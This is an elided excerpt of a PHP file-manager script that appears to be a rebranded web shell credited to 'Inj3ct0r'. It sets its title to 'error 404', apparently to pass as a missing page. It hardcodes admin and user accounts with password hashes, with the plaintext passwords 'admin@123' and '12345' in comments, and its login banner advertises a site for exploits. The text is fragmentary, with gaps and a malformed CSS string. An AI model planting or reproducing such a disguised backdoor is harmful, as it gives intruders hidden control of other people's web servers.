...
//TFM version
define('VERSION', '14.5.3');

//Application Title
define('APP_TITLE', 'error 404');
...
$auth_users = array(
    'admin' => '$2y$10$cXO1D9AiNmN59nMt.Rtqbez5uKf08ckEuU//7QOOukdYkVnO../ae', //admin@123
    'user' => '$2y$10$cXO1D9AiNmN59nMt.Rtqbez5uKf08ckEuU//7QOOukdYkVnO../ae' //12345
);
...
if ($use_auth) {
    ...
    Coded by: <font color="white">Inj3ct0r v<?php echo VERSION; ?></font> <font color="white">|</font> Telegram: <font color="white"><a href="Skype:inj3ct0r">inj3ct0r</a></font><br /><br />
    <br > <font color="green">For more tools/scripts/exploits/etc.</font>
    <br />visit <a href="http://inj3ct0r.com" target="_blank" style="text-decoration: none;">www.inj3ct0r.com</a>
    </font>
                        </div>
                    </div>
                </div>
...
<head>
    ...
    <style>
        body.fm-login-page{ background-color:#333;font-size:14px;background-color:#333;background-image:url("http://i.imgur.com/zHNCk2e.gif'); background-repeat: repeat; background-position: center; background-attachment: fixed;");}
